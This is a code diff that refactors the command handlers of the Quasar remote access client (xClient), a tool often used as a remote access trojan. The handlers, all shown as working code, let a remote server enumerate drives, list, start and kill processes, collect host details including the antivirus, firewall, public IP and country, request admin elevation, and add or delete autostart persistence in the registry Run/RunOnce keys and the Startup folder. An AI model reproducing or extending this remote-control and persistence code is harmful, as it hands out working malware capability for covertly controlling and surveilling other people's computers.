@@ -1,78 +1,75 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
 using System.Windows.Forms;
-using Microsoft.Win32;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
-using xClient.Enums;
+using Models = Quasar.Common.Models;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
     public static partial class CommandHandler
     {
-        public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
+        public static void HandleGetDrives(GetDrives command, Client client)
         {
-            DriveInfo[] drives;
+            DriveInfo[] driveInfos;
             try
             {
-                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
             }
             catch (IOException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives I/O error", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives I/O error", SetLastDirectorySeen = false});
                 return;
             }
             catch (UnauthorizedAccessException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives No permission", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives No permission", SetLastDirectorySeen = false});
                 return;
             }
 
-            if (drives.Length == 0)
+            if (driveInfos.Length == 0)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives No drives", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
                 return;
             }
 
-            string[] displayName = new string[drives.Length];
-            string[] rootDirectory = new string[drives.Length];
+            Models.Drive[] drives = new Models.Drive[driveInfos.Length];
             for (int i = 0; i < drives.Length; i++)
             {
-                string volumeLabel = null;
                 try
                 {
-                    volumeLabel = drives[i].VolumeLabel;
-                }
-                catch
-                {
-                }
+                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
+                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
+                            driveInfos[i].VolumeLabel,
+                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat)
+                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
+                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat);
 
-                if (string.IsNullOrEmpty(volumeLabel))
-                {
-                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
-                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                    drives[i] = new Models.Drive
+                        { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                 }
-                else
+                catch (Exception)
                 {
-                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
-                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                    
                 }
-                rootDirectory[i] = drives[i].RootDirectory.FullName;
             }
 
-            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
+            client.Send(new GetDrivesResponse {Drives = drives});
         }
 
-        public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
+        public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
         {
             try
             {
@@ -100,42 +97,58 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Action failed: {ex.Message}"});
             }
         }
 
-        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
+        public static void HandleGetStartupItems(GetStartupItems command, Client client)
         {
             try
             {
-                List<string> startupItems = new List<string>();
+                List<Models.StartupItem> startupItems = new List<Models.StartupItem>();
 
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Models.StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Models.StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Models.StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun});
+                        }
                     }
                 }
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Models.StartupItem
+                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce});
+                        }
                     }
                 }
                 if (PlatformHelper.Is64Bit)
@@ -144,14 +157,24 @@ namespace xClient.Core.Commands
                     {
                         if (key != null)
                         {
-                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
+                            foreach (var item in key.GetKeyValues())
+                            {
+                                startupItems.Add(new Models.StartupItem
+                                    {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run});
+                            }
                         }
                     }
                     using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                     {
                         if (key != null)
                         {
-                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
+                            foreach (var item in key.GetKeyValues())
+                            {
+                                startupItems.Add(new Models.StartupItem
+                                {
+                                    Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64RunOnce
+                                });
+                            }
                         }
                     }
                 }
@@ -159,88 +182,87 @@ namespace xClient.Core.Commands
                 {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
 
-                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
-                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
-                                          select "6" + formattedKeyValue);
+                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Models.StartupItem
+                        {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu}));
                 }
 
-                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
+                client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Getting Autostart Items failed: {ex.Message}"});
             }
         }
 
-        public static void HandleDoStartupItemAdd(Packets.ServerPackets.DoStartupItemAdd command, Client client)
+        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
         {
             try
             {
-                switch (command.Type)
+                switch (command.StartupItem.Type)
                 {
-                    case 0:
+                    case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 1:
+                    case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 2:
+                    case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 3:
+                    case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 4:
+                    case StartupType.LocalMachineWoW64Run:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 5:
+                    case StartupType.LocalMachineWoW64RunOnce:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
-                    case 6:
+                    case StartupType.StartMenu:
                         if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                         {
                             Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                         }
 
                         string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
-                            command.Name + ".url");
+                            command.StartupItem.Name + ".url");
 
                         using (var writer = new StreamWriter(lnkPath, false))
                         {
                             writer.WriteLine("[InternetShortcut]");
-                            writer.WriteLine("URL=file:///" + command.Path);
+                            writer.WriteLine("URL=file:///" + command.StartupItem.Path);
                             writer.WriteLine("IconIndex=0");
-                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
+                            writer.WriteLine("IconFile=" + command.StartupItem.Path.Replace('\\', '/'));
                             writer.Flush();
                         }
                         break;
@@ -248,66 +270,66 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Adding Autostart Item failed: {ex.Message}"});
             }
         }
 
-        public static void HandleDoStartupItemRemove(Packets.ServerPackets.DoStartupItemRemove command, Client client)
+        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
         {
             try
             {
-                switch (command.Type)
+                switch (command.StartupItem.Type)
                 {
-                    case 0:
+                    case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 1:
+                    case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 2:
+                    case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 3:
+                    case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 4:
+                    case StartupType.LocalMachineWoW64Run:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 5:
+                    case StartupType.LocalMachineWoW64RunOnce:
                         if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
-                    case 6:
-                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
+                    case StartupType.StartMenu:
+                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.StartupItem.Name);
 
                         if (!File.Exists(startupItemPath))
                             throw new IOException("File does not exist");
@@ -318,11 +340,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Removing Autostart Item failed: {ex.Message}"});
             }
         }
 
-        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
+        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
         {
             try
             {
@@ -331,78 +353,59 @@ namespace xClient.Core.Commands
                 var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                 var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
 
-
-                string[] infoCollection = new string[]
+                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
-                    "Processor (CPU)",
-                    DevicesHelper.GetCpuName(),
-                    "Memory (RAM)",
-                    string.Format("{0} MB", DevicesHelper.GetTotalRamAmount()),
-                    "Video Card (GPU)",
-                    DevicesHelper.GetGpuName(),
-                    "Username",
-                    WindowsAccountHelper.GetName(),
-                    "PC Name",
-                    SystemHelper.GetPcName(),
-                    "Domain Name",
-                    domainName,
-                    "Host Name",
-                    hostName,
-                    "System Drive",
-                    Path.GetPathRoot(Environment.SystemDirectory),
-                    "System Directory",
-                    Environment.SystemDirectory,
-                    "Uptime",
-                    SystemHelper.GetUptime(),
-                    "MAC Address",
-                    DevicesHelper.GetMacAddress(),
-                    "LAN IP Address",
-                    DevicesHelper.GetLanIp(),
-                    "WAN IP Address",
-                    GeoLocationHelper.GeoInfo.Ip,
-                    "Antivirus",
-                    SystemHelper.GetAntivirus(),
-                    "Firewall",
-                    SystemHelper.GetFirewall(),
-                    "Time Zone",
-                    GeoLocationHelper.GeoInfo.Timezone,
-                    "Country",
-                    GeoLocationHelper.GeoInfo.Country,
-                    "ISP",
-                    GeoLocationHelper.GeoInfo.Isp
+                    new Tuple<string, string>("Processor (CPU)", DevicesHelper.GetCpuName()),
+                    new Tuple<string, string>("Memory (RAM)", $"{DevicesHelper.GetTotalRamAmount()} MB"),
+                    new Tuple<string, string>("Video Card (GPU)", DevicesHelper.GetGpuName()),
+                    new Tuple<string, string>("Username", WindowsAccountHelper.GetName()),
+                    new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
+                    new Tuple<string, string>("Domain Name", domainName),
+                    new Tuple<string, string>("Host Name", hostName),
+                    new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
+                    new Tuple<string, string>("System Directory", Environment.SystemDirectory),
+                    new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
+                    new Tuple<string, string>("MAC Address", DevicesHelper.GetMacAddress()),
+                    new Tuple<string, string>("LAN IP Address", DevicesHelper.GetLanIp()),
+                    new Tuple<string, string>("WAN IP Address", GeoLocationHelper.GeoInfo.Ip),
+                    new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
+                    new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
+                    new Tuple<string, string>("Time Zone", GeoLocationHelper.GeoInfo.Timezone),
+                    new Tuple<string, string>("Country", GeoLocationHelper.GeoInfo.Country),
+                    new Tuple<string, string>("ISP", GeoLocationHelper.GeoInfo.Isp)
                 };
 
-                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+                client.Send(new GetSystemInfoResponse {SystemInfos = lstInfos});
             }
             catch
             {
             }
         }
 
-        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
+        public static void HandleGetProcesses(GetProcesses command, Client client)
         {
             Process[] pList = Process.GetProcesses();
-            string[] processes = new string[pList.Length];
-            int[] ids = new int[pList.Length];
-            string[] titles = new string[pList.Length];
+            var processes = new Models.Process[pList.Length];
 
-            int i = 0;
-            foreach (Process p in pList)
+            for (int i = 0; i < pList.Length; i++)
             {
-                processes[i] = p.ProcessName + ".exe";
-                ids[i] = p.Id;
-                titles[i] = p.MainWindowTitle;
-                i++;
+                var process = new Models.Process
+                {
+                    Name = pList[i].ProcessName + ".exe",
+                    Id = pList[i].Id,
+                    MainWindowTitle = pList[i].MainWindowTitle
+                };
+                processes[i] = process;
             }
 
-            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+            client.Send(new GetProcessesResponse {Processes = processes});
         }
 
-        public static void HandleDoProcessStart(Packets.ServerPackets.DoProcessStart command, Client client)
+        public static void HandleDoProcessStart(DoProcessStart command, Client client)
         {
-            if (string.IsNullOrEmpty(command.Processname))
+            if (string.IsNullOrEmpty(command.ApplicationName))
             {
-                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
+                client.Send(new SetStatus {Message = "Process could not be started!"});
                 return;
             }
 
@@ -411,36 +414,36 @@ namespace xClient.Core.Commands
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
                     UseShellExecute = true,
-                    FileName = command.Processname
+                    FileName = command.ApplicationName
                 };
                 Process.Start(startInfo);
             }
             catch
             {
-                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
+                client.Send(new SetStatus {Message = "Process could not be started!"});
             }
             finally
             {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+                HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoProcessKill(Packets.ServerPackets.DoProcessKill command, Client client)
+        public static void HandleDoProcessKill(DoProcessKill command, Client client)
         {
             try
             {
-                Process.GetProcessById(command.PID).Kill();
+                Process.GetProcessById(command.Pid).Kill();
             }
             catch
             {
             }
             finally
             {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+                HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
+        public static void HandleDoAskElevate(DoAskElevate command, Client client)
         {
             if (WindowsAccountHelper.GetAccountType() != "Admin")
             {
@@ -460,7 +463,7 @@ namespace xClient.Core.Commands
                 }
                 catch
                 {
-                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
+                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                     MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                     return;
                 }
@@ -468,11 +471,11 @@ namespace xClient.Core.Commands
             }
             else
             {
-                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
+                client.Send(new SetStatus {Message = "Process already elevated."});
             }
         }
         
-        public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
+        public static void HandleDoShellExecute(DoShellExecute command, Client client)
         {
             string input = command.Command;
 
